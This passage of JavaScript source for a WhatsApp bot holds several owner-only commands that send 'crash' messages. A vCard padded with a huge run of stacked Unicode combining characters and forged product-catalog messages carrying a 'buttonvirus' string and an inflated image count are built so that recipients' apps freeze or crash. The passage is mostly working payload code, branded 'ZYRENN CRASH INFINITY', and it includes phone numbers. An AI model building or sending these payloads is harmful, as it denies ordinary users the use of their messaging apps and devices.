̸̷̳̟ͮ̄ͦ̃́͋̒͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"
 }
 }
}
zyren.sendMessage(m.chat, { text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘" }, { quoted: main }) 
}}
break
//=================================================//
/*BUG WACAP */
case "catalogc": {
if (!isCreator) return onlyOwner()
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${cttl}`,
"description": `${cttl}`,
"bodyText": `${bd}${buttonvirus}`,
"footerText": `${ft}`,
"productImageCount": 923456789,
"firstImageId": 1,
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
/*BUG WACAP */
case "jadicatalogc": {
if (!isCreator) return onlyOwner()
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
var messa = await prepareWAMessageMedia({ image: { url: media }}, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${q}${mt1}`,
"description": `${q}${mt1}`,
"bodyText": `${q}${mt2}${buttonvirus}`,
"footerText": `${q}${mt2}`,
"productImageCount": 923456789,
"firstImageId": 1,
"retailerId": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case "jadicatalog+": {
if (!isCreator) return onlyOwner()
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
var messa = await prepareWAMessageMedia({ image: { url: media}}, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${q}${mt1}`,
"description": `${q}${mt1}`,
"currencyCode": "IDR",
"bodyText": `${q}${mt2}${buttonvirus}`,
"footerText": `${q}${mt2}`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case "jadicatalog": {
if (!isCreator) return onlyOwner()
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
var messa = await prepareWAMessageMedia({ image: {url:media}}, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️${mt1}`,
"description": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️${mt1}`,
"bodyText": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️${mt2}${buttonvirus}`,
"footerText": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️${mt2}`,
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
/*BUG WACAP */
case "catalog+": {
if (!isCreator) return onlyOwner()
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${cttl}`,
"description": `${cttl}`,
"currencyCode": "IDR",
"bodyText": `${bd}${buttonvirus}`,
"footerText": `${ft}`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
